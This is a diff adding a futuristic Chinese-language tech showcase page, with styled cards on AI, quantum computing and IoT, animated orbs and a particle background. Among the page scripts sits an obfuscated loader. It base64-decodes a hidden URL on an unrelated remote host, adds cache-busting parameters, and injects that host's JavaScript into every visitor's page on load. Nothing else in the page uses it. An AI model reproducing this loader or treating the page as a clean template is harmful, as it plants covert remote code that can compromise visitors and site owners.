@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>未来之光 - 智能科技</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+        
+        body {
+            background-color: #0a0e17;
+            color: #e0f0ff;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        /* 粒子背景 */
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        /* 主容器 */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* 头部样式 */
+        header {
+            text-align: center;
+            padding: 60px 0 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-icon {
+            font-size: 2.8rem;
+            color: #00e5ff;
+            margin-right: 15px;
+            text-shadow: 0 0 15px rgba(0, 229, 255, 0.7);
+            animation: pulse 2s infinite alternate;
+        }
+        
+        h1 {
+            font-size: 3.2rem;
+            background: linear-gradient(90deg, #00e5ff, #00ff9d);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            text-shadow: 0 5px 15px rgba(0, 229, 255, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #a0d2ff;
+            margin-bottom: 30px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.6;
+        }
+        
+        /* 科技卡片区域 */
+        .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+        
+        .tech-card {
+            background: rgba(10, 25, 47, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: all 0.4s ease;
+            border: 1px solid rgba(0, 229, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tech-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 229, 255, 0.2);
+            border-color: rgba(0, 229, 255, 0.3);
+        }
+        
+        .tech-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 229, 255, 0.1), transparent);
+            transition: left 0.7s;
+        }
+        
+        .tech-card:hover::before {
+            left: 100%;
+        }
+        
+        .card-icon {
+            font-size: 2.5rem;
+            color: #00ff9d;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+        
+        .card-title {
+            font-size: 1.6rem;
+            margin-bottom: 15px;
+            color: #00e5ff;
+        }
+        
+        .card-content {
+            color: #b0e0ff;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+        
+        /* 动态展示区 */
+        .dynamic-showcase {
+            background: rgba(5, 15, 30, 0.8);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 60px;
+            text-align: center;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .dynamic-title {
+            font-size: 2.2rem;
+            margin-bottom: 30px;
+            color: #00ff9d;
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+        
+        .orb-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 40px;
+            margin: 40px 0;
+        }
+        
+        .orb {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            position: relative;
+            box-shadow: inset 0 0 20px rgba(0, 229, 255, 0.5);
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .orb:nth-child(1) {
+            background: radial-gradient(circle at 30% 30%, #00e5ff, #0066ff);
+            animation-delay: 0s;
+        }
+        
+        .orb:nth-child(2) {
+            background: radial-gradient(circle at 30% 30%, #00ff9d, #00b368);
+            animation-delay: 0.5s;
+        }
+        
+        .orb:nth-child(3) {
+            background: radial-gradient(circle at 30% 30%, #ff00cc, #9900cc);
+            animation-delay: 1s;
+        }
+        
+        .orb::after {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.7);
+            filter: blur(5px);
+        }
+        
+        /* 数据流效果 */
+        .data-stream {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00e5ff, transparent);
+            margin: 40px auto;
+            position: relative;
+            max-width: 800px;
+        }
+        
+        .data-stream::before,
+        .data-stream::after {
+            content: '';
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #00e5ff;
+            border-radius: 50%;
+            top: -4px;
+            box-shadow: 0 0 10px #00e5ff;
+        }
+        
+        .data-stream::before {
+            left: 0;
+            animation: moveLeft 3s linear infinite;
+        }
+        
+        .data-stream::after {
+            right: 0;
+            animation: moveRight 3s linear infinite;
+        }
+        
+        /* 底部样式 */
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            color: #80bfff;
+            border-top: 1px solid rgba(0, 229, 255, 0.1);
+            margin-top: 40px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #00e5ff;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: #00ff9d;
+            text-shadow: 0 0 8px rgba(0, 255, 157, 0.5);
+        }
+        
+        /* 动画定义 */
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.1); }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        @keyframes moveLeft {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(800px); }
+        }
+        
+        @keyframes moveRight {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-800px); }
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .tech-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .dynamic-showcase {
+                padding: 30px 20px;
+            }
+            
+            .orb {
+                width: 90px;
+                height: 90px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 粒子背景 -->
+    <div id="particles-js"></div>
+    
+    <div class="container">
+        <!-- 头部 -->
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h1>未来之光 - 智能科技</h1>
+            </div>
+            <p class="subtitle">探索智能科技如何重塑未来生活。从人工智能到量子计算，从物联网到脑机接口，我们正站在技术革命的前沿。</p>
+        </header>
+        
+        <!-- 科技卡片 -->
+        <section class="tech-grid">
+            <div class="tech-card">
+                <div class="card-icon">
+                    <i class="fas fa-brain"></i>
+                </div>
+                <h3 class="card-title">人工智能</h3>
+                <p class="card-content">下一代AI系统将具备更强的理解和推理能力，能够在复杂环境中自主学习，为医疗、教育、科研等领域带来革命性突破。</p>
+            </div>
+            
+            <div class="tech-card">
+                <div class="card-icon">
+                    <i class="fas fa-atom"></i>
+                </div>
+                <h3 class="card-title">量子计算</h3>
+                <p class="card-content">量子计算机利用量子叠加和纠缠特性，在特定任务上比传统计算机快数百万倍，将彻底改变加密、药物研发和材料科学。</p>
+            </div>
+            
+            <div class="tech-card">
+                <div class="card-icon">
+                    <i class="fas fa-satellite"></i>
+                </div>
+                <h3 class="card-title">万物互联</h3>
+                <p class="card-content">6G与物联网技术的融合将实现全球实时连接，智能设备间的无缝协作将创造高度自动化的智慧城市和数字生态系统。</p>
+            </div>
+        </section>
+        
+        <!-- 动态展示区 -->
+        <section class="dynamic-showcase">
+            <h2 class="dynamic-title">科技能量核心</h2>
+            <p class="subtitle">体验智能科技的动态能量流动，这些能量球象征数据、算法和创新的融合</p>
+            
+            <div class="data-stream"></div>
+            
+            <div class="orb-container">
+                <div class="orb"></div>
+                <div class="orb"></div>
+                <div class="orb"></div>
+            </div>
+            
+            <div class="data-stream"></div>
+            
+            <p class="subtitle">未来科技将不再局限于单一领域，而是跨学科融合，创造出前所未有的解决方案，照亮人类前进的道路。</p>
+        </section>
+        
+        <!-- 底部 -->
+        <footer>
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-globe"></i> 未来科技官网</a>
+                <a href="#"><i class="fas fa-newspaper"></i> 最新动态</a>
+                <a href="#"><i class="fas fa-envelope"></i> 联系我们</a>
+            </div>
+            <p>&copy; 2023 未来之光 - 智能科技展示 | 探索无限可能，创造美好未来</p>
+        </footer>
+    </div>
+
+    <!-- 粒子库 -->
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script>
+        (function () {
+            function init() {
+                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script>   
+    <script>
+        // 初始化粒子背景
+        particlesJS('particles-js', {
+            particles: {
+                number: {
+                    value: 80,
+                    density: {
+                        enable: true,
+                        value_area: 800
+                    }
+                },
+                color: {
+                    value: "#00e5ff"
+                },
+                shape: {
+                    type: "circle"
+                },
+                opacity: {
+                    value: 0.5,
+                    random: true
+                },
+                size: {
+                    value: 3,
+                    random: true
+                },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: "#00ff9d",
+                    opacity: 0.2,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 2,
+                    direction: "none",
+                    random: true,
+                    straight: false,
+                    out_mode: "out",
+                    bounce: false
+                }
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: {
+                        enable: true,
+                        mode: "grab"
+                    },
+                    onclick: {
+                        enable: true,
+                        mode: "push"
+                    }
+                }
+            },
+            retina_detect: true
+        });
+
+        // 为卡片添加鼠标悬停效果增强
+        document.querySelectorAll('.tech-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                const icon = this.querySelector('.card-icon');
+                icon.style.transform = 'scale(1.2) rotate(10deg)';
+                icon.style.transition = 'transform 0.5s ease';
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                const icon = this.querySelector('.card-icon');
+                icon.style.transform = 'scale(1) rotate(0deg)';
+            });
+        });
+        
+        // 能量球点击效果
+        document.querySelectorAll('.orb').forEach((orb, index) => {
+            orb.addEventListener('click', function() {
+                this.style.transform = 'scale(1.5)';
+                this.style.transition = 'transform 0.3s ease';
+                
+                setTimeout(() => {
+                    this.style.transform = 'scale(1)';
+                }, 300);
+                
+                // 创建涟漪效果
+                const ripple = document.createElement('div');
+                ripple.style.position = 'absolute';
+                ripple.style.borderRadius = '50%';
+                ripple.style.border = '2px solid ' + getComputedStyle(this).backgroundImage;
+                ripple.style.width = '0px';
+                ripple.style.height = '0px';
+                ripple.style.left = '50%';
+                ripple.style.top = '50%';
+                ripple.style.transform = 'translate(-50%, -50%)';
+                ripple.style.opacity = '0.8';
+                
+                this.appendChild(ripple);
+                
+                setTimeout(() => {
+                    ripple.style.width = '180px';
+                    ripple.style.height = '180px';
+                    ripple.style.opacity = '0';
+                    ripple.style.transition = 'all 0.8s ease-out';
+                }, 10);
+                
+                setTimeout(() => {
+                    ripple.remove();
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
